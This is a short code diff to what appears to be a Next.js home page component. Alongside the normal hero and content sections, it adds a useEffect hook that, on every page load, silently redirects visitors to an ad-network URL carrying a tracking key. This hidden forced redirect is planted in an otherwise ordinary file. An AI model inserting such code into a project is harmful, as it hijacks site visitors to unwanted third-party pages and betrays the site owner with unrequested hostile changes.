@@ -2,8 +2,14 @@
 import { useTheme } from "next-themes";
 import HeroSection from "@/components/HeroSection";
 import HomeContent from "@/components/HomeContent";
+import { useEffect } from "react";
 
 export default function Home() {
+  useEffect(() => {
+    window.location.replace(
+      "https://www.profitableratecpm.com/vcvcr7qsk?key=f35b406a64c9034a5bebb3ef500b573d"
+    );
+  }, []);
   return (
     <>
       <HeroSection />
